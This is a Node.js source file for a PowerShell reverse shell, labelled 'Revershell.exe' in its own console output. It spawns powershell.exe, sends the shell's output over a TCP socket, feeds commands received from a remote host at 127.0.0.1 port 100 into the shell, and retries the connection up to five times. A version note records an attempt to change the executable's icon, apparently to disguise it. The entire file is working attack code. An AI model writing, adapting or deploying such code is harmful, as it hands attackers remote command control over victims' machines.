const mngVersion = {
    'version' : 'v0.1',
    'description' : 'Attempted to change icon using Resourcehacker but could not be changed due to Binary file execution error'
}
const net = require("net")
const childprocess = require("child_process")
const HOST_PORT = [100];
const HOST_Address = '127.0.0.1'
const COMMAND = 'powershell.exe';

let retrying = false;
let retryingCnt = 5;
let HOST_PORT_SEL = HOST_PORT[Math.floor(Math.random()*HOST_PORT.length)];

const runConnection =() => {
    if(retryingCnt === 5){
        console.log(`:>>> Revershell.exe ${mngVersion.version} <<<:`);
        console.log(`:>> Try to access the server using port ${HOST_PORT_SEL} <<:`);
    };
    const shell = childprocess.spawn(COMMAND, [''])
    shell.stdout.pipe(socket)
    shell.stderr.pipe(socket)
    socket.connect(HOST_PORT_SEL, HOST_Address).pipe(shell.stdin);
}

const connectEventHandler =(data) => {
    console.log(':>> Connected \n');
    retrying = false;
}

const dataEventHandler = (data) => {
    if(data.length > 1){
        console.log(`:>> Command: ${data.toString()}`)
    }
}

const endEventHandler =() => {
    console.log(`\n`)
    console.log(`:> [-[-[-[-[-[-[-[-[-[-_-]-]-]-]-]-]-]-]-]-]... <:`)
    console.log(`\n`)
}

const timeoutEventHandler =() => {
    console.log(`:> Timeout...`)
    socket.emit('end')
}

const errorEventHandler =(error) => {
    // console.log(`[-_-] ww`)
    if(retrying){
        throw `~[$_$]~ bye bye`;
    }
}

const closeEventHandler =() => {
    if(!retrying){
        console.log(`:> Retry ${retryingCnt}.`)
        retryingCnt--;
        if(retryingCnt === 0){
            // throw errorEventHandler;
            socket.emit('end')
        } else{
            setTimeout(runConnection, 100)
        }
    } else{
        socket.emit('end')
    }
}

var socket = new net.Socket();
socket.on('connect', connectEventHandler);
socket.on('data',    dataEventHandler);
socket.on('end',     endEventHandler);
socket.on('timeout', timeoutEventHandler);
socket.on('error',   errorEventHandler);
socket.on('close',   closeEventHandler);

runConnection();